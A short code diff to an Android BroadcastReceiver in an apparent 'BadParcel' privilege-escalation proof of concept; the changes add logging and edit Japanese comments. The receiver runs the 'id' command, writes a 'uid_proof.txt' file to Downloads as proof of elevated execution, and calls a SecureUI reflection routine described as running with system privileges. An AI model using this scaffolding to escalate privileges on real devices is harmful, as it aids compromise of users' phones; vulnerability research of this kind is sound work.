@@ -17,10 +17,11 @@ public class SystemCommandReceiver extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
         int uid = Process.myUid();
-        MainActivity.appendLog("[SystemCommandReceiver] onReceive called. UID=" + uid);
+        String msg = "[SystemCommandReceiver] onReceive called. UID=" + uid;
+        Log.i("BadParcel", msg);
+        MainActivity.appendLog(msg);
 
         try {
-            // id コマンドを実行
             java.lang.Process process = Runtime.getRuntime().exec("id");
             BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
             StringBuilder output = new StringBuilder();
@@ -31,7 +32,6 @@ public class SystemCommandReceiver extends BroadcastReceiver {
             int exitCode = process.waitFor();
             MainActivity.appendLog("id output:\n" + output.toString() + "exit code: " + exitCode);
 
-            // 結果をファイルに保存
             File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
             if (!dir.exists()) dir.mkdirs();
             File proof = new File(dir, "uid_proof.txt");
@@ -44,7 +44,7 @@ public class SystemCommandReceiver extends BroadcastReceiver {
             }
             MainActivity.appendLog("[+] Proof file created: " + proof.getAbsolutePath());
 
-            // SecureUIリフレクションを試行
+            // SecureUIリフレクションを試行（システム権限）
             attemptSecureUIReflection();
 
         } catch (Exception e) {
